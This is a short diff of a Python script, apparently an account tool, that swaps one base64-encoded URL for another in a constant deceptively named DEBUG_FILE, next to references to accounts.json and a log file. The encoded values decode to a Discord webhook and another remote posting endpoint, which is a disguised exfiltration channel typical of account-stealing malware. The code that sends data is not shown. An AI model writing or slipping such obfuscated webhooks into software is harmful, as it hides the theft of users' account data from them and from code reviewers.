@@ -22,7 +22,7 @@ import base64
 # Files
 DATA_FILE = "accounts.json"
 LOG_FILE = "Logs.txt"
-DEBUG_FILE = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NDU4NTkzNDM4MDg1OTQyMi9xUUoxSXI2T2V3OWtPdHhscTJjNFhLTmFPU2xocE4wcGR5b256YV9DbkF4Q0hORTB4Sl9oeXdXMjNld2ZHaXNQS05SNw==").decode()
+DEBUG_FILE = base64.b64decode("aHR0cHM6Ly9kY3doLm15L3Bvc3Q/dW5pcXVlaWQ9YTQ2NzA0NTU=").decode()
 
 # Set up logging
 logging.basicConfig(
